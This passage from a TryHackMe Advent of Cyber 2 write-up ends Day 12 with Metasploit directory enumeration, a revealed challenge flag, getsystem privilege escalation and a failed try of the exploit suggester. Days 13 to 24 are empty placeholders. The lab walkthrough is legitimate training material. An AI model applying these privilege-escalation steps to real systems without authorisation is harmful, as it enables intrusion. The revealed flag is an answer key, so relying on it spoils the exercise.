   ![MSF Run](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_Metasploit_Run.png)
   
   Now we can enumerate the directory and view the contents of the flag (`type` does work here fortunately).
   
   ![MSF Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_Metasploit_Flag1.png)
   
   ><details><summary>Click for answer</summary>thm{whacking_all_the_elves}</details>

5. Looking for a challenge? Try to find out some of the vulnerabilities present to escalate your privileges!

   Unfortunately, I couldn't get this to work with the post exploit scripts as mentioned in the hint. I did, however, manage to use `getsystem` to gain admin priveleges.
   
   ![Get System](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_Metasploit_Get_System.png)
   
   The first method I used (which didn't work yet) was as follows:
   
   `search exploit suggest` this gave us the exploit suggestion module.
   
   ![MSF Suggester](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_MSF_Suggest.png)
   
   For this modules we only needed to add our session number.
   
   ![MSF Suggester Options](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_MSF_Suggest_Options.png)
   
   Unfortunately, I couldn't get it to connect. I will have to look at some Priv Esc rooms for this one.
   
   Some more resources I used:

   - [Getsystem command for Metasploit - Priv Esc](https://docs.rapid7.com/metasploit/meterpreter-getsystem/)
   - [Windows privilege escalation - Reddit](https://www.reddit.com/r/HowToHack/comments/6zxh68/looking_for_some_help_with_windows_privilege/)

### [Day 13] [](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2013)



1. 

   ><details><summary>Click for answer</summary></details>

### [Day 14] [](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2014)



1. 

   ><details><summary>Click for answer</summary></details>

### [Day 15] [](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2015)



1. 

   ><details><summary>Click for answer</summary></details>

### [Day 16] [](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2016)



1. 

   ><details><summary>Click for answer</summary></details>

### [Day 17] [](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2017)



1. 

   ><details><summary>Click for answer</summary></details>

### [Day 18] [](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2018)



1. 

   ><details><summary>Click for answer</summary></details>

### [Day 19] [](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2019)



1. 

   ><details><summary>Click for answer</summary></details>

### [Day 20] [](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2020)



1. 

   ><details><summary>Click for answer</summary></details>

### [Day 21] [](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2021)



1. 

   ><details><summary>Click for answer</summary></details>

### [Day 22] [](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2022)



1. 

   ><details><summary>Click for answer</summary></details>

### [Day 23] [](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2023)



1. 

   ><details><summary>Click for answer</summary></details>

### [Day 24] [](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2024)



1. 

   ><details><summary>Click for answer</summary></details>

